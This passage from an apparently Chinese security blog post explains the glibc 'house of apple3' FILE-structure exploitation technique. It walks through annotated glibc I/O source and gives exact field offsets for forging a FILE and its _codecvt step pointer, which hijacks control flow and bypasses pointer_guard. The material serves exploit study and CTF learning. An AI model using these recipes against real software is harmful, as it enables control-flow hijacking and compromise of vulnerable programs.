class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">            <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"> </span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">            (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">             (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">             &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">       <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>__gconv_fct</code>和<code>DL_CALL_FCT</code>被定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>而在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code>，代码片段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 需要进入这个分支</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">    <span class="comment">// 需要一路调用到这里</span></span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                   &amp;read_stop,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">           <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。</p><p>分析到这里，利用原理就呼之欲出了：劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p><p>注意，在伪造过程中，可以设置<code>gs-&gt;__shlib_handle == NULL</code>，从而绕过<code>__pointer_guard</code>的指针调用保护。</p><hr><p><strong>注意：</strong><br>因为<code>_wide_data</code>设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的<code>_wide_data</code>成员（默认会指向<code>_IO_wide_data_2</code>，除了<code>_wide_vtable</code>外其他成员均默认为<code>0</code>），也并不影响<code>house of apple3</code>的利用。</p><p>因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可</p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>目前在<code>glibc</code>源码中搜索到的<code>__libio_codecvt_in/__libio_codecvt_out/__libio_codecvt_length</code>的调用链比较多</p><h3 id="利用-IO-wfile-underflow函数控制程序执行流"><a href="#利用-IO-wfile-underflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow函数控制程序执行流"></a>利用_IO_wfile_underflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li><li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure><h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流-1"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流-1" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~4</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用</p><h3 id="利用-IO-wdo-write函数控制程序执行流"><a href="#利用-IO-wdo-write函数控制程序执行流" class="headerlink" title="利用_IO_wdo_write函数控制程序执行流"></a>利用_IO_wdo_write函数控制程序执行流</h3><p><code>IO_wdo_write</code>的调用点很多，这里选择一个相对简单的链：</p><p>对<code>fp</code>的设置如下：</p><ul><li><code>vtable</code>设置为<code>_IO_file_jumps/</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li><li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li><li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li><li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li><li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li><li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">        _IO_wdo_write</span><br><span class="line">          __libio_codecvt_out</span><br><span class="line">              DL_CALL_FCT</span><br><span class="line">                  gs = fp-&gt;_codecvt-&gt;__cd_out.step</span><br><span class="line">                  *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>首先看<code>_IO_new_file_sync</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;<span class="comment">//调用到这里</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p><p>然后看<code>_IO_do_flush</code>宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><p>根据<code>fp-&gt;_mode</code>的值选择调用<code>_IO_do_write</code>或者<code>_IO_wdo_write</code>。这里我们要调用后者，必须使<code>fp-&gt;_mode &gt; 0</code>。此时的第二个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_base</code>，第三个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base</code>。</p><p>接着看<code>_IO_wdo_write</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_wdo_write (FILE *fp, <span class="type">const</span> <span class="type">wchar_t</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 第三个参数必须要大于0</span></span><br><span class="line">  <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">      &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;<span class="comment">// 不能进入这个分支</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">      result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                    data, data + to_do, &amp;new_data,</span><br><span class="line">                    write_ptr,</span><br><span class="line">                    buf_end,</span><br><span class="line">                    &amp;write_ptr);</span><br><span class="line">          <span class="comment">//......</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先<code>to_do</code>必须要大于<code>0</code>，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p><p>这个链基本需要控制<code>fp-&gt;_wide_data</code>，相比上两条链的约束条件要更多一点。</p><h3 id="使用-IO-wfile-sync函数控制程序执行流"><a href="#使用-IO-wfile-sync函数控制程序执行流" class="headerlink" title="使用_IO_wfile_sync函数控制程序执行流"></a>使用_IO_wfile_sync函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li><li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li><li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 